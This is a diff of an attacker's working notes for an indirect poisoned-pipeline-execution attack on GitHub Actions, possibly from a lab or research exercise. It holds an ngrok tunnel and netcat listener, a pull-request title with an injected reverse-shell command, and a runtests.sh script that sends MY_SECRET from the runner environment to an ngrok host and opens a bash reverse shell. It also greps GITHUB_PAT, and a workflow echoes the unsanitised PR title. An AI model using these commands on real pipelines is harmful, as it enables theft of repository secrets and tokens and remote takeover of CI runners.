@@ -1,14 +1,20 @@
 ngrok tcp 1000
 sudo nc -lvk 1000
 
-New malicious issue title" && bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/10129 0>&1 && echo "
+New malicious issue title" && bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/18280 0>&1 && echo "
 
 runtests.sh:
 #echo "Execution from READ user" > /dev/tcp/7.tcp.eu.ngrok.io/13524
 #env | grep MY_SECRET > /dev/tcp/7.tcp.eu.ngrok.io/13524
-echo ------- I-PPE From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/4.tcp.eu.ngrok.io/10129
+echo "------- I-PPE-3  From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET)" > /dev/tcp/7.tcp.eu.ngrok.io/18280
 
 bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/13524 0>&1
+
+
+env | grep MY_SECRET
+env | grep GITHUB_PAT
+env | grep PR_ID
+
 
 curl -L \
   -X PUT \
@@ -37,12 +43,13 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Building ... 
+      - name: Building ...  
         run: |
           mkdir -p ./bin
           touch ./bin/mybin.exe
+          cat runtests.sh
           cp runtests.sh ./bin
-          echo ""${{github.event.pull_request.title}}" > ./bin/PR_TITLE.txt
+          echo "${{github.event.pull_request.title}}" > ./bin/PR_TITLE.txt
           echo "${{github.event.number}}" > ./bin/PR_ID.txt
           ls -lR 
 
@@ -52,4 +59,3 @@ jobs:
           name: archive-bin
           path: |
             bin
-
